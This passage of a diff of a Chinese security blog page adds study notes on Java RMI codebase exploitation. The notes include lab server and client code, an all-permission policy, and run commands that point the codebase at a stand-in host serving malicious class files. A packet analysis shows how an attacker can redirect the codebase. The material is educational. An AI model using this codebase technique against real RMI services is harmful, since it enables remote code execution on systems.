class="line">        LocateRegistry.createRegistry(1099);  </span><br><span class="line">        Naming.rebind(&quot;refObj&quot;, h);  </span><br><span class="line">    &#125;  </span><br><span class="line">    public static void main(String[] args) throws Exception &#123;  </span><br><span class="line">        new RemoteRMIServer().start();  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>④ <code>client.policy</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">grant &#123;  </span><br><span class="line">    permission java.security.AllPermission;  </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<p>编译及运行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">javac *.java</span><br><span class="line">java -Djava.rmi.server.hostname=127.0.0.1 -Djava.rmi.server.useCodebaseOnly=false -Djava.security.policy=client.policy RemoteRMIServer</span><br></pre></td></tr></table></figure>
+<p>这里记得版本一定要正确，不然就会一直报错 <code>错误: 找不到或无法加载主类</code>，我是用的 <code>jdk 7u13</code><br>然后，我们再建立一个<code>RMIClient.java</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">import java.rmi.Naming;  </span><br><span class="line">import java.util.List;  </span><br><span class="line">import java.util.ArrayList;  </span><br><span class="line">import java.io.Serializable;  </span><br><span class="line">public class RMIClient implements Serializable &#123;  </span><br><span class="line">    public class Payload extends ArrayList&lt;Integer&gt; &#123;&#125;  </span><br><span class="line">    public void lookup() throws Exception &#123;  </span><br><span class="line">        ICalc r = (ICalc)  </span><br><span class="line">                Naming.lookup(&quot;rmi://127.0.0.1:1099/refObj&quot;);  </span><br><span class="line">        List&lt;Integer&gt; li = new Payload();  </span><br><span class="line">        li.add(3);  </span><br><span class="line">        li.add(4);  </span><br><span class="line">        System.out.println(r.sum(li));  </span><br><span class="line">    &#125;  </span><br><span class="line">    public static void main(String[] args) throws Exception &#123;  </span><br><span class="line">        new RMIClient().lookup();  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这个Client我们需要在另一个位置运行，不能将<code>RMIClient.java</code>放在<code>RMI Server</code>所在的目录中，因为我们需要让<code>RMI Server</code>在本地<code>CLASSPATH</code>里找不到类，才会去加载<code>codebase</code>中的类<br>然后运行<code>RMIClient</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -Djava.rmi.server.useCodebaseOnly=false -Djava.rmi.server.codebase=http://example.com/ RMIClient</span><br></pre></td></tr></table></figure>
+<p>这里的 <code>http://example.com</code> 就是我们的存放着恶意字节码文件(<code>.class文件</code>)的网站。</p>
+<h2 id="codebase传递和利用的原理"><a href="#codebase传递和利用的原理" class="headerlink" title="codebase传递和利用的原理"></a>codebase传递和利用的原理</h2><p>第二篇说了这个漏洞，那第三篇就来说一下这个漏洞的过程和原理<br>我们在执行上一个漏洞的整个流程中进行抓包，会发现进行攻击的时候，也有两个 TCP 连接：</p>
+<blockquote>
+<ol>
+<li>本机与<code>RMI Registry</code>的通信（1099端口）</li>
+<li>本机与<code>RMI Server</code>的通信</li>
+</ol>
+</blockquote>
+<p>我们用 <code>tcp.stream eq 0</code> 来筛选出<code>本机与RMI Registry</code>的数据流：<br>我们打开协议为 RMI ，描述为 <code>JRMI、Call</code> 的包，看到最后有段数据由<code>0xACED</code>开头，这是一段Java序列化数据。我们可以使用，<a target="_blank" rel="noopener" href="https://github.com/NickstaDB/SerializationDumper">SerializationDumper</a>这个工具对Java序列化数据进行分析。</p>
+<p>分析之后会看到用类似BNF（巴科斯范式）的形式描述的序列化数据语法。然后我们分析序列化之后的数据，可知，这一整个序列化对象，其实描述的就是一个字符串，其值是 <code>refObj</code> 。意思是获取远程的 <code>refObj</code> 对象。然后我们看一下描述为 <code>JRMI,ReturnData</code>的这一个数据包。在这个数据包中，有一段数据储存在 <code>objectAnnotation</code> 中，这段数据记录了 <code>RMI Server</code>的地址和端口，接下来就开始调用远程方法。<br>我们用<code>tcp.stream eq 1</code> 筛选出本机与<code>RMI Server</code>的数据流，在这个数据流中，没有看到识别为 <code>RMI</code> 协议的包，我们看到其中的一个数据包是是 <code>50 ac ed</code> 开头，<code>50</code>是指 <code>RMI Call</code>，<code>ac ed</code>就是指java序列化的数据，我们用上面提到的工具分析一下这段数据。</p>
+<p>(图源于P神-java安全漫谈)<br><img src="https://qingwan.top/images/245144.png" class="lazyload" data-srcset="https://qingwan.top/images/245144.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="><br>可见，我们的 <code>codebase</code> 是通过 <code>[Ljava.rmi.server.ObjID</code>; 的 <code>classAnnotations</code> 传递的。所以，即使我们没有RMI的客户端，只需要修改 <code>classAnnotations</code> 的值，就能控制<code>codebase</code>，使其指向攻击者的恶意网站。</p>
+<p>这里介绍补充一下什么是<code>classAnnotations</code>？<br>在序列化Java类的时候用到了一个类，叫 <code>ObjectOutputStream</code> ，用于将 Java 对象序列化为字节流。它继承自 <code>OutputStream</code> 类，并提供了一系列方法来将 Java 对象写入输出流中。这个类内部有一个方法<code>annotateClass</code> ， <code>ObjectOutputStream</code> 的子类有需要向序列化后的数据里放任何内容，都可以重写这个方法，写入你自己想要写入的数据。然后反序列化时，就可以读取到这个信息并使用。</p>
+<p>所以说，在分析序列化数据时，如果我们看到了 <code>classAnnotations</code>，那么实际上这些注解信息就是通过 <code>annotateClass</code> 方法写入到序列化数据中的。</p>
+<p>换句话说，当一个类被序列化时，它的注解信息可能会被记录下来并写入序列化数据中。当我们在反序列化过程中恢复对象时，这些注解信息也会随着对象一起被读取。如果我们在分析序列化数据时看到了 <code>classAnnotations</code>，那么我们可以推断这些注解信息是在序列化过程中通过 <code>annotateClass</code> 方法写入的。</p>
 
   </div>
   
@@ -2709,10 +2777,10 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     <div class='new-meta-box'>
       
         
-          <div class="new-meta-item date" itemprop="dateModified" datetime="2024-01-08T15:54:08+08:00">
+          <div class="new-meta-item date" itemprop="dateModified" datetime="2024-05-14T12:29:33+08:00">
   <a class='notlink'>
     <i class="fa-solid fa-edit fa-fw" aria-hidden="true"></i>
-    <p>更新于：2024年1月8日</p>
+    <p>更新于：2024年5月14日</p>
   </a>
 </div>
 
@@ -2736,21 +2804,16 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
   
     <div class="prev-next">
       
-        <a class='prev' href='/2024/01/12/PTH/'>
-          <p class='title'><i class="fa-solid fa-chevron-left" aria-hidden="true"></i>域渗透横向移动--pass the hash</p>
-          <p class='content'>hash传递攻击的相关手法、防御措施及其绕过
-
-
-“Pass the Hash” 攻击是一种通过窃取用户密码的哈希值，而无需获取实际密码的攻击手法。在 Windows 系统中，用户密码通常以哈希...</p>
-        </a>
       
-      
-        <a class='next' href='/2024/01/08/DedeCMS%20v5.7.105%20--%20RCE%E5%A4%8D%E7%8E%B0/'>
-          <p class='title'>DedeCMS v5.7.105 -- RCE复现<i class="fa-solid fa-chevron-right" aria-hidden="true"></i></p>
-          <p class='content'>Dedecms框架漏洞复现④
+        <a class='next' href='/2024/05/09/Java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88--%E5%8F%8D%E5%B0%84/'>
+          <p class='title'>Java安全漫谈学习笔记① -- Java反射 (1-3)<i class="fa-solid fa-chevron-right" aria-hidden="true"></i></p>
+          <p class='content'>这个系列的博客主要是在看P神的安全漫谈之后的一些笔记还有对应一些地方的扩展以及自己的了解。
 
 
-环境搭建漏洞影响版本： &lt;&#x3D;DedeCMS v5.7.105下载dedecms v5.7.105版本或其以下的源码（可以去官网或者GitHub上...</p>
+Java基础知识在学习反射之前，我们先了解一下关于 java 的基础知识
+
+java运行的全过程
+...</p>
         </a>
       
     </div>
@@ -2766,7 +2829,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
   <article class="post white-box shadow floatable blur" id="comments">
     <span hidden>
-      <meta itemprop="discussionUrl" content="/2024/01/08/DedeCMS%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%A4%8D%E7%8E%B0%20%EF%BC%88CVE-2022-35516%EF%BC%89/index.html#comments">
+      <meta itemprop="discussionUrl" content="/2024/05/14/Java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88--RMI/index.html#comments">
     </span>
     <p ct><i class='fa-solid fa-comments'></i> 评论</p>
     
@@ -2808,7 +2871,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
 
     <div class='content'>
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4"><span class="toc-text">漏洞影响范围</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-text">漏洞复现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%AE%E8%A1%A5%E6%96%B9%E6%B3%95"><span class="toc-text">修补方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%9D%E8%80%83"><span class="toc-text">思考</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#RMI%E7%9A%84%E8%BF%87%E7%A8%8B%E5%88%86%E6%9E%90"><span class="toc-text">RMI的过程分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RMI%E7%9B%B8%E5%85%B3%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95-%E2%80%93-RMI%E5%88%A9%E7%94%A8codebase%E6%89%A7%E8%A1%8C%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81"><span class="toc-text">RMI相关攻击手法 – RMI利用codebase执行任意代码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#codebase%E4%BC%A0%E9%80%92%E5%92%8C%E5%88%A9%E7%94%A8%E7%9A%84%E5%8E%9F%E7%90%86"><span class="toc-text">codebase传递和利用的原理</span></a></li></ol>
     </div>
   </section>
 
@@ -3475,7 +3538,7 @@ window.matchMedia('(prefers-color-scheme: light)').addListener(darkModelListener
 </script>
 
 
-  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"清风菀月轩","url":"https://qingwan.top/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"Qingwan","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"https://qingwan.top/","sameAs":["https://github.com/volantis-x"],"description":"个人博客"},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"https://qingwan.top/","name":"清风菀月轩"}},{"@type":"ListItem","position":2,"item":{"@id":"https://qingwan.top/categories/代码审计/","name":"代码审计"}},{"@type":"ListItem","position":3,"item":{"@id":"https://qingwan.top/2024/01/08/DedeCMS远程代码执行复现 （CVE-2022-35516）/","name":"DedeCMS远程代码执行复现 （CVE-2022-35516）"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"清风菀月轩","url":"https://qingwan.top/","description":"个人博客","author":{"@type":"Person","name":"Qingwan","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"https://qingwan.top/","description":"个人博客"},"publisher":{"@type":"Organization","name":"清风菀月轩","url":"https://qingwan.top/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"https://qingwan.top?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","headline":"DedeCMS远程代码执行复现 （CVE-2022-35516）","description":"Dedecms框架漏洞复现⑤","inLanguage":["zh-CN","en","zh-HK","zh-TW","default"],"mainEntityOfPage":{"@type":"WebPage","@id":"https://qingwan.top/2024/01/08/DedeCMS%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%A4%8D%E7%8E%B0%20%EF%BC%88CVE-2022-35516%EF%BC%89/"},"author":{"@type":"Person","name":"Qingwan","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"https://qingwan.top/"},"publisher":{"@type":"Organization","name":"清风菀月轩","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"https://qingwan.top/2024/01/08/DedeCMS%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%A4%8D%E7%8E%B0%20%EF%BC%88CVE-2022-35516%EF%BC%89/","wordCount":14,"datePublished":"2024-01-08T07:50:31.021Z","dateModified":"2024-01-08T07:54:08.839Z","articleSection":"代码审计","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
+  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"清风菀月轩","url":"https://qingwan.top/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"Qingwan","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"https://qingwan.top/","sameAs":["https://github.com/volantis-x"],"description":"个人博客"},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"https://qingwan.top/","name":"清风菀月轩"}},{"@type":"ListItem","position":2,"item":{"@id":"https://qingwan.top/categories/Java学习/","name":"Java学习"}},{"@type":"ListItem","position":3,"item":{"@id":"https://qingwan.top/2024/05/14/Java安全漫谈--RMI/","name":"Java安全漫谈学习笔记② -- JavaRMI (4-6)"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"清风菀月轩","url":"https://qingwan.top/","description":"个人博客","author":{"@type":"Person","name":"Qingwan","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"https://qingwan.top/","description":"个人博客"},"publisher":{"@type":"Organization","name":"清风菀月轩","url":"https://qingwan.top/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"https://qingwan.top?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","headline":"Java安全漫谈学习笔记② -- JavaRMI (4-6)","description":"Java中RMI (Remote Method Invocation，远程方法调用) 模型的介绍及应用","inLanguage":["zh-CN","en","zh-HK","zh-TW","default"],"mainEntityOfPage":{"@type":"WebPage","@id":"https://qingwan.top/2024/05/14/Java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88--RMI/"},"author":{"@type":"Person","name":"Qingwan","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"https://qingwan.top/"},"publisher":{"@type":"Organization","name":"清风菀月轩","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"https://qingwan.top/2024/05/14/Java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88--RMI/","wordCount":51,"datePublished":"2024-05-14T04:24:40.929Z","dateModified":"2024-05-14T04:29:33.614Z","articleSection":"Java学习","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
 
 
 
